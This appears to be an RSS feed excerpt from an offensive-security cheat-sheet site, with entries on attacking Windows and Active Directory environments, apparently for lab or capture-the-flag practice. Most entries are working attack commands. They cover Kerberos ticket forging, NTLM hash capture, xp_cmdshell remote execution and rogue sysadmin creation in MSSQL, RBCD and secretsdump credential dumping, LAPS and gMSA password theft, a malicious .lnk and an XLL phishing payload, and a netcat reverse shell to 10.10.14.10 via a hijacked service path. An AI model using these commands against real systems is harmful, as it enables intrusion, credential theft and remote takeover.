      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/kerberos/</guid>
      <description>Kerbrute kerbrute&#xA;kerbrute userenum --domain &amp;lt;DOMAIN&amp;gt; --dc &amp;lt;DC&amp;gt; usernames.txt Usernames generator username-anarchy&#xA;./username-anarchy -i users.txt | tee usernames.txt Generate Kerberos Ticket (From Linux) Method #1: Using impacket sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getTGT -hashes :&amp;lt;HASH&amp;gt; &amp;lt;DOMAIN&amp;gt;/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist Method #2 : Using kinit # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to &amp;#39;/etc/hosts&amp;#39; (Try different order if not work) 10.</description>
    </item>
    <item>
      <title>Krbrelayx</title>
      <link>https://tldrbins.github.io/krbrelayx/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/krbrelayx/</guid>
      <description> Tools krbrelayx&#xA;Abuse #1: Add Active Directory Integrated DNS records via LDAP python3 dnstool.py -u &amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --action add --record test --data 10.10.14.10 --type A 10.10.11.10 # Capture NTLM hash sudo responder -I tun0 </description>
    </item>
    <item>
      <title>LDAP</title>
      <link>https://tldrbins.github.io/ldap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ldap/</guid>
      <description>Enum # Using nmap script sudo nmap -p 389 --script ldap-search &amp;lt;TARGET&amp;gt; # Using ldapdomaindump (With Creds) ldapdomaindump -u &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; -p &amp;lt;PASSWORD&amp;gt; &amp;lt;TARGET&amp;gt; -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b &amp;#39;DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; &amp;#39;(objectClass=person)&amp;#39; # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.</description>
    </item>
    <item>
      <title>Machine Account</title>
      <link>https://tldrbins.github.io/machine_account/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/machine_account/</guid>
      <description> Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account .\rubeus.exe tgtdeleg /nowrap 2. Convert kirbi to ccache (Back to Linux) RubeusToCcache&#xA;python3 rubeustoccache.py &amp;lt;BASE64_TICKET&amp;gt; secrets.kirbi secrets.ccache 3. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-secretsdump -k -no-pass -just-dc-user administrator </description>
    </item>
    <item>
      <title>Metasploit</title>
      <link>https://tldrbins.github.io/metasploit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/metasploit/</guid>
      <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
    </item>
    <item>
      <title>Microsoft Access Database</title>
      <link>https://tldrbins.github.io/microsoft_access_database/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/microsoft_access_database/</guid>
      <description> Tool sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo &amp;#34;$table: $lines&amp;#34;; fi; done # Dump data from table mdb-export database.mdb &amp;lt;TABLE_NAME&amp;gt; </description>
    </item>
    <item>
      <title>Microsoft Oulook Email Folder</title>
      <link>https://tldrbins.github.io/microsoft_outlook/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/microsoft_outlook/</guid>
      <description>Open .pst file Tool sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Use mutt mutt -Rf emails.mbox +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Open .</description>
    </item>
    <item>
      <title>MSSQL Agent Jobs</title>
      <link>https://tldrbins.github.io/mssql_agent_jobs/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_agent_jobs/</guid>
      <description>1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Fix : Cannot resolve the collation conflict between &amp;#34;Latin1_General_CI_AI&amp;#34; and &amp;#34;SQL_Latin1_General_CP1_CI_AS&amp;#34; SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN=&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;; INSERT proxies EXEC msdb.</description>
    </item>
    <item>
      <title>MSSQL General</title>
      <link>https://tldrbins.github.io/mssql_general/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_general/</guid>
      <description>General Connect to MSSQL DB (From Linux) impacket-mssqlclient &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; # Without TLS impacket-mssqlclient -windows-auth &amp;#39;&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt;&amp;#39; Connect to MSSQL DB (From Windows) # With inline query sqlcmd -S &amp;lt;TARGET&amp;gt; -U &amp;lt;USER&amp;gt; -P &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DB_NAME&amp;gt; -Q &amp;#34;SELECT @@version;&amp;#34; Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = &amp;#39;1&amp;#39;; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.</description>
    </item>
    <item>
      <title>MSSQL Linked Servers</title>
      <link>https://tldrbins.github.io/mssql_linked_server/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
      <description> Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) at [&amp;lt;LINKED_SERVER&amp;gt;]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN &amp;lt;USER&amp;gt; WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;lt;USER&amp;gt;&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [&amp;lt;CURRENT_SERVER&amp;gt;]&amp;#39;) AT [&amp;lt;LINKED_SERVER&amp;gt;] </description>
    </item>
    <item>
      <title>MSSQL Privilege Escalation</title>
      <link>https://tldrbins.github.io/mssql_privilege_escalation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/mssql_privilege_escalation/</guid>
      <description>Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or use master; exec xp_dirtree &amp;#39;\\10.10.14.10\any\thing&amp;#39;; # Or load_file(&amp;#39;\\10.10.14.10\any\thing&amp;#39;); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;show advanced options&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; exec sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1; execute as login = &amp;#39;sa&amp;#39;; reconfigure; execute as login = &amp;#39;sa&amp;#39;; EXEC master.</description>
    </item>
    <item>
      <title>NetExec (nxc)</title>
      <link>https://tldrbins.github.io/nxc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/nxc/</guid>
      <description>nxc Download nxc&#xA;Basic Commands # Single user and password nxc smb 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # Single user and password (Active Directory) nxc smb -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; # Multiple users or passwords nxc smb -u usernames.txt -p &amp;lt;PASSWORD&amp;gt; -d &amp;lt;DOMAIN&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt; --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.</description>
    </item>
    <item>
      <title>NTLM Relay Attack</title>
      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
      <description>1. Run socat to redirect traffic (In Windows Target) socat&#xA;# Upload socat.zip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
    </item>
    <item>
      <title>Phishing</title>
      <link>https://tldrbins.github.io/phishing/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/phishing/</guid>
      <description>Abuse #1: Create a malicious .lnk $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut(&amp;#34;C:\ProgramData\Calculator.lnk&amp;#34;) $link.TargetPath = &amp;#34;C:\ProgramData\rev.exe&amp;#34; $link.Save() Abuse #2: Phishing with XLL (Excel) revshells.com&#xA;shell.c #include &amp;lt;windows.h&amp;gt; __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec(&amp;#34;&amp;lt;PowerShell #3 Base64 Payload&amp;gt;&amp;#34;, 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.</description>
    </item>
    <item>
      <title>RBCD Attack</title>
      <link>https://tldrbins.github.io/rbcd/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rbcd/</guid>
      <description>RBCD Attack (From Linux) 0. Check machine account quota nxc ldap 10.10.11.10 -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name &amp;#39;EvilComputer&amp;#39; -computer-pass &amp;#39;password&amp;#39; -dc-ip 10.10.11.10 &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; 2. Rbcd attack impacket-rbcd -delegate-to &amp;lt;TARGET_COMPUTER&amp;gt;$ -delegate-from EvilComputer$ -dc-ip &amp;lt;DC&amp;gt; -action &amp;#39;write&amp;#39; &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt; 3. Impersonate sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -spn cifs/&amp;lt;TARGET_DOMAIN&amp;gt; -impersonate administrator -dc-ip &amp;lt;DC&amp;gt; &amp;#39;&amp;lt;DOMAIN&amp;gt;/EvilComputer:password&amp;#39; 4. Import ticket export KRB5CCNAME=administrator@cifs_&amp;lt;TARGET_DOMAIN&amp;gt;@&amp;lt;DOMAIN&amp;gt;.ccache 5. Post-Attack # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-psexec &amp;lt;DOMAIN&amp;gt;/administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass # Or secretsdump impacket-secretsdump administrator@&amp;lt;TARGET_DOMAIN&amp;gt; -k -no-pass -just-dc-user Administrator RBCD Attack (From Windows) 1.</description>
    </item>
    <item>
      <title>ReadGMSAPassword</title>
      <link>https://tldrbins.github.io/readgmsapassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
      <description> Abuse #1: Read GMSAPassword (From Linux) gMSADumper gMSADumper&#xA;python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -l &amp;lt;TARGET&amp;gt; -d &amp;lt;DOMAIN&amp;gt; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; get object &amp;lt;TARGET_OBJECT&amp;gt; --attr msDS-ManagedPassword Abuse #2: Save as Cred (From Windows) $gmsa = Get-ADServiceAccount -Identity &amp;lt;TARGET_NAME&amp;gt; -Properties &amp;#39;msDS-ManagedPassword&amp;#39; $mp = $gmsa.&amp;#39;msDS-ManagedPassword&amp;#39; $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword $cred = New-Object System.Management.Automation.PSCredential &amp;lt;TARGET_NAME&amp;gt;, $SecPass # For example, change password of another target user Invoke-Command -ComputerName &amp;lt;COMPUTER_NAME&amp;gt; -ScriptBlock {Set-ADAccountPassword -Identity &amp;lt;ANOTHER_TARGET_NAME&amp;gt; -reset -NewPassword (ConvertTo-SecureString -AsPlainText &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -force)} -Credential $cred </description>
    </item>
    <item>
      <title>ReadLAPSPassword</title>
      <link>https://tldrbins.github.io/readlapspassword/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/readlapspassword/</guid>
      <description> Abuse #1: Read LAPS password (From Windows) 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred Abuse #1: Read LAPS Password (From Linux) ldapsearch -h 10.10.11.10 -b &amp;#39;DC=&amp;lt;,example&amp;gt;,DC=&amp;lt;com&amp;gt;&amp;#39; -x -D &amp;lt;USER&amp;gt;@&amp;lt;TARGET&amp;gt; -w &amp;lt;PASSWORD&amp;gt; &amp;#34;(ms-MCS-AdmPwd=*)&amp;#34; ms-MCS-AdmPwd </description>
    </item>
    <item>
      <title>RPC</title>
      <link>https://tldrbins.github.io/rpc/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/rpc/</guid>
      <description> rpcclient # Connect without creds rpcclient -U &amp;#39;&amp;#39; -N 10.10.11.10 # Connect with creds rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 # Inline execute command rpcclient -U &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;%&amp;lt;PASSWORD&amp;gt; 10.10.11.10 -c &amp;#39;querydispinfo&amp;#39; Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup &amp;lt;RID&amp;gt; # Query group member by rid querygroupmem &amp;lt;RID&amp;gt; # Query user by rid queryuser &amp;lt;RID&amp;gt; # Look up a user lookupnames &amp;lt;USER&amp;gt; # Look up by SID lookupsids &amp;lt;SID&amp;gt; impacket-lookupsid impacket-lookupsid &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; </description>
    </item>
    <item>
      <title>Runas</title>
      <link>https://tldrbins.github.io/runas/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/runas/</guid>
      <description>Runas (with cred object) Create cred object (Method #1) $username = &amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34; $password = &amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Create cred object (Method #2) $password = ConvertTo-SecureString &amp;#34;&amp;lt;PASSWORD&amp;gt;&amp;#34; -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential(&amp;#34;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#34;, $password) Run Commnad Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp # Invoke command with config Invoke-Command -ScriptBlock { C:\ProgramData\rev.</description>
    </item>
    <item>
      <title>Scheduled tasks</title>
      <link>https://tldrbins.github.io/scheduled_tasks_windows/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/scheduled_tasks_windows/</guid>
      <description> Check scheduled tasks schtasks /query # List details schtasks /TN \Microsoft\Windows\&amp;lt;FOLDER&amp;gt;\&amp;lt;TASKNAME&amp;gt; /FO LIST /V </description>
    </item>
    <item>
      <title>SeBackupPrivilege/SeRestorePrivilege</title>
      <link>https://tldrbins.github.io/sebackupprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
      <description>Abuse #1: Robocopy # For example robocopy /b &amp;lt;TARGET_DIR_PATH&amp;gt; C:\Windows\Tasks &amp;lt;TARGET_FILE&amp;gt; Abuse #2: Using helper dlls SeBackupPrivilegeUtils.dll&#xA;SeBackupPrivilegeCmdLets.dll&#xA;import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;TARGET_FILE_PATH&amp;gt; C:\ProgramData\&amp;lt;TARGET_FILE&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\ProgramData\ntds.dit Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.</description>
    </item>
    <item>
      <title>secretsdump</title>
      <link>https://tldrbins.github.io/secretsdump/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secretsdump/</guid>
      <description> With ntds.dit and SYSTEM hive impacket-secretsdump -ntds ntds.dit -system system LOCAL With SAM, SYSTEM and SECURITY Hives impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL With dcsync right impacket-secretsdump impacket-secretsdump &amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;@&amp;lt;TARGET&amp;gt; nxc nxc smb -dc-ip &amp;lt;DC&amp;gt; -u &amp;lt;USER&amp;gt; -H &amp;lt;HASH&amp;gt; --ntds </description>
    </item>
    <item>
      <title>Secure String</title>
      <link>https://tldrbins.github.io/secrue_string/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/secrue_string/</guid>
      <description> Decrypt secure string $s = cat pass.xml $ss = Convertto-securestring -string $s $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist &amp;#34;administrator&amp;#34;, $ss $cred.GetNetworkCredential().password </description>
    </item>
    <item>
      <title>SeDebugPrivilege</title>
      <link>https://tldrbins.github.io/sedebugprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
      <description> Abuse #1: Meterpreter Migrate # Inside meterpreter ps winlogon migrate &amp;lt;PID&amp;gt; Abuse #2 : psgetsys.ps1 psgetsys&#xA;# Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;powershell #3 Base64&amp;gt;&amp;#34; </description>
    </item>
    <item>
      <title>SeImpresonate</title>
      <link>https://tldrbins.github.io/seimpresonate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seimpresonate/</guid>
      <description>Abuse #1: Recover SeImpresonate FullPower&#xA;.\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.</description>
    </item>
    <item>
      <title>SeLoadDriverPrivilege</title>
      <link>https://tldrbins.github.io/seloaddriverprivilege/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/seloaddriverprivilege/</guid>
      <description>Abuse #1: Install malicious driver 1. Compile eoploaddriver eoploaddriver.cpp&#xA;+---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include &amp;#34;stdafx.h&amp;#34;` | | 7. Release -&amp;gt; x64 | | 8. Build -&amp;gt; Build Solution | | 9.</description>
    </item>
    <item>
      <title>Server Operators</title>
      <link>https://tldrbins.github.io/server_operators/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/server_operators/</guid>
      <description> Abuse #1: Change service path # Change a service path (e.g. browser) sc.exe config browser binPath= &amp;#34;C:\ProgramData\nc.exe -e cmd.exe 10.10.14.10 443&amp;#34; # Stop service sc.exe stop browser # Start service sc.exe stop browser Additional: Create service # Create a service sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto </description>
    </item>
    <item>
      <title>Silver Ticket</title>
      <link>https://tldrbins.github.io/silver_ticket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/silver_ticket/</guid>
      <description>From Windows 1. Get service principle name (SPN) .\rubeus.exe kerberoast /domain:&amp;lt;DOMAIN&amp;gt; /dc:&amp;lt;DC&amp;gt; /creduser:&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt; /credpassword:&amp;lt;PASSWORD&amp;gt; /nowrap 2. Generate NTLM .\rubeus.exe hash /password:&amp;lt;PASSWORD&amp;gt; 3. Get domain SID 3a. Locally import-module activedirectory Get-ADDomain | fl DomainSID 3b. Remotely # Install ldp.exe (Windows 11) Settings &amp;gt; System &amp;gt; Optional Features &amp;gt; More Windows Features and add &amp;#39;Active Driectory Lightweight Directory Services&amp;#39; # Bind &amp;gt; Bind with credentials ldp.exe # Browse &amp;gt; Search BaseDN: DC=&amp;lt;example&amp;gt;,DC=&amp;lt;com&amp;gt; Filter: (objectclass=User) 4.</description>
    </item>
    <item>
      <title>SMB Enum</title>
      <link>https://tldrbins.github.io/smb_enum/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/smb_enum/</guid>
      <description>SMB Share Enum nmap script sudo nmap --script=smb-enum-shares -p 445 &amp;lt;TARGET&amp;gt; Login without password smbmap smbmap -H &amp;lt;TARGET&amp;gt; --no-banner smbmap -H &amp;lt;TARGET&amp;gt; -u null --no-banner # List known share smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; smbclient smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ # After found an accessible share smbclient -N \\\\&amp;lt;TARGET&amp;gt;\\&amp;lt;SHARE&amp;gt;\\ # Fix: Unable to initialize messaging context. protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED smbclient -N -L \\\\&amp;lt;TARGET&amp;gt;\\ --option=&amp;#39;client min protocol=NT1&amp;#39; Login with password smbmap smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; # List known share smbmap -H &amp;lt;TARGET&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -R &amp;lt;SHARE&amp;gt; # Download file smbmap -H &amp;lt;TARGET&amp;gt; -r &amp;lt;SHARE&amp;gt; --download &amp;lt;PATH/TO/FILE&amp;gt; # List files with regex pattern smbmap -H 